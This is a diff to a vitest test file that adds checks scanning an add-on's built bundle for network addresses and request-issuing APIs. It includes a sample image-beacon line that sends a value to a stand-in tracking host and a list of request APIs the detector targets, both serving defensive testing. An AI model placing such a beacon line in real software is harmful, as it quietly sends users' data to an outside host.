@@ -27,6 +27,8 @@
 
 import { describe, expect, it } from "vitest";
 
+import { foreignImportsIn, offendingAddresses, sendersIn } from "@adminium/add-on-host/testing";
+
 import manifest from "../manifest.json";
 import { emittedFiles, readEmitted } from "./testing/dist.ts";
 import { ALLOWED_TOKENS, CARVE_OUTS, scanForBannedLexicon } from "./testing/lexicon.ts";
@@ -167,5 +169,53 @@ describe("the vocabulary ban, over built output (17 §2, 24 D12)", () => {
     for (const fine of ["proof_required", "productKey", "Propriétés", "stopPropagation"]) {
       expect(scanForBannedLexicon("fine", fine), fine).toEqual([]);
     }
+  });
+});
+
+/**
+ * D11 OVER THE ARTEFACT, WHICH IS WHERE THE MUTANT REACHED.
+ *
+ * `sources.test.ts` states the rule over the sources; this states it over the
+ * bytes a host serves. The two are not the same check: an address can arrive
+ * from a dependency, survive minification as a folded constant, or be written
+ * in a file the source walk does not classify as shipped. A verifier put an
+ * image beacon into a sibling package's component and it reached a live host's
+ * bundle with every gate green — the bundle is the last place it can be caught,
+ * and this is the gate that reads it.
+ *
+ * The sender net runs over built output here because this package's `dist/` is
+ * ITS OWN CODE. React and every other dependency are external (see the entry
+ * assertions above), so a request-issuing API in these bytes was written here.
+ */
+describe("nothing in the artefact can reach a host we do not control (24 D11)", () => {
+  const BYTES = /\.(js|css|html|map)$/;
+
+  it("names no address at all, in any emitted file", () => {
+    // The empty allow-list is the assertion: this add-on declares no `network`
+    // block, so the FIRST URL to appear in its bundle is a finding, whatever it
+    // points at and however it got there.
+    const offences = emitted
+      .filter((file) => BYTES.test(file))
+      .flatMap((file) => offendingAddresses(readEmitted(file), []).map((url) => `${file} → ${url}`));
+    expect(offences).toEqual([]);
+  });
+
+  it("carries nothing that can issue a request", () => {
+    const offences = emitted
+      .filter((file) => BYTES.test(file))
+      .flatMap((file) => [
+        ...sendersIn(readEmitted(file)).map((means) => `${file} → ${means}`),
+        ...foreignImportsIn(readEmitted(file)).map((spec) => `${file} → ${spec}`),
+      ]);
+    expect(offences).toEqual([]);
+  });
+
+  it("would report an image beacon, which is the mutant that beat the old grep", () => {
+    // Driven over the detector rather than restated beside it: the mutant's own
+    // two lines, which contain none of `fetch`, `XMLHttpRequest`, `WebSocket`,
+    // `sendBeacon` or `EventSource`, and which both nets catch.
+    const mutant = 'const img=new Image();img.src="https://tracking.example-analytics.net/p?c="+c;';
+    expect(offendingAddresses(mutant, [])).toEqual(["https://tracking.example-analytics.net/p?c="]);
+    expect(sendersIn(mutant)).toEqual(["new Image — an image beacon"]);
   });
 });
